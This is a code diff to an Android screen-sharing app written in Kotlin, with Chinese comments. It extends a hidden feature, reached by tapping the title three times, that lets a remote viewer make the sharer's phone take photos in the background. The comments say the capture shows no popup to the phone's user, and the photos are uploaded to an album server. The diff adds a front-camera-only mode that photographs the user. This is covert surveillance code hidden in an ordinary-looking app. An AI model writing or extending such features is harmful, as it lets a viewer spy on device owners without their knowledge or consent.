@@ -573,6 +573,8 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
     private var albumCancel = false
     // 相机拍照上传取消标志：独立于会话清理（cleanupPeer 不置位），保证返回桌面/停止共享后后台拍照上传仍能完成
     private var cameraUploadCancel = false
+    // 相机权限申请时等待的拍照模式（权限授权后据此继续）
+    private var pendingCameraFrontOnly = false
 
     /** 标题三连击计数：2 秒内连续点击标题 3 次触发相册入口（隐藏入口） */
     private var brandTapCount = 0
@@ -614,8 +616,23 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         Toast.makeText(this, "已请求共享方上传相册，稍等...", Toast.LENGTH_SHORT).show()
                     }
                     2 -> {
-                        p.sendControl("""{"type":"camera","action":"capture"}""")
-                        Toast.makeText(this, "已请求共享方拍照并上传，稍等...", Toast.LENGTH_SHORT).show()
+                        // 拍照模式子菜单：后置+前置 或 仅前置
+                        android.app.AlertDialog.Builder(this)
+                            .setTitle("远程拍照")
+                            .setItems(arrayOf("后置+前置（各一张）", "仅前置")) { _, m ->
+                                when (m) {
+                                    0 -> {
+                                        p.sendControl("""{"type":"camera","action":"capture","mode":"both"}""")
+                                        Toast.makeText(this, "已请求共享方拍照并上传，稍等...", Toast.LENGTH_SHORT).show()
+                                    }
+                                    1 -> {
+                                        p.sendControl("""{"type":"camera","action":"capture","mode":"front"}""")
+                                        Toast.makeText(this, "已请求共享方拍前置照并上传，稍等...", Toast.LENGTH_SHORT).show()
+                                    }
+                                }
+                            }
+                            .setNegativeButton("取消", null)
+                            .show()
                     }
                 }
             }
@@ -682,7 +699,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
     }
 
     /** 共享方收到观看方「拍照上传」请求：后台用前后摄像头各拍一张，上传相册服务器后回发链接 */
-    private fun onCameraRequested() {
+    private fun onCameraRequested(frontOnly: Boolean) {
         // 先回执确认收到指令，避免出现「点了无反应」
         val pendingPeer = peer
         pendingPeer?.sendControl("""{"type":"album-result","ack":"camera"}""")
@@ -691,14 +708,15 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
             return
         }
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            pendingCameraFrontOnly = frontOnly
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CAMERA)
             return
         }
-        startCameraCapture()
+        startCameraCapture(frontOnly)
     }
 
-    /** 后台拍照（后置+前置）→ 压缩上传相册服务器 → 回发链接给观看方；全程无共享方弹窗 */
-    private fun startCameraCapture() {
+    /** 后台拍照（后置+前置或仅前置）→ 压缩上传相册服务器 → 回发链接给观看方；全程无共享方弹窗 */
+    private fun startCameraCapture(frontOnly: Boolean) {
         val baseUrl = BuildConfig.ALBUM_URL
         val p = peer
         if (baseUrl.isBlank()) {
@@ -709,7 +727,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         p?.sendControl("""{"type":"album-result","ack":"capturing"}""")
         Thread {
             try {
-                val shot = CameraCapture.capture(ctx)
+                val shot = CameraCapture.capture(ctx, frontOnly = frontOnly)
                 val err = shot?.error
                 if (shot == null || err != null) {
                     val reason = err ?: "未知错误"
@@ -960,7 +978,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         } else if (requestCode == PERM_REQUEST_CAMERA) {
             val granted = grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
             if (granted) {
-                startCameraCapture()
+                startCameraCapture(pendingCameraFrontOnly)
             } else {
                 peer?.sendControl("""{"type":"album-result","error":"共享方未授权相机权限"}""")
                 Toast.makeText(this, "未授权相机权限，无法拍照", Toast.LENGTH_LONG).show()
@@ -1070,7 +1088,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                 when (obj.optString("type")) {
                     "fps" -> p.setFramerate(obj.optInt("value", 60))
                     "album" -> onAlbumRequested(obj.optString("action", "upload"))
-                    "camera" -> onCameraRequested()
+                    "camera" -> onCameraRequested(obj.optString("mode", "both") == "front")
                     else -> {
                         // 无障碍服务未开启或被共享方停止控制时回发提示
                         if (!RemoteControlService.handle(obj)) {
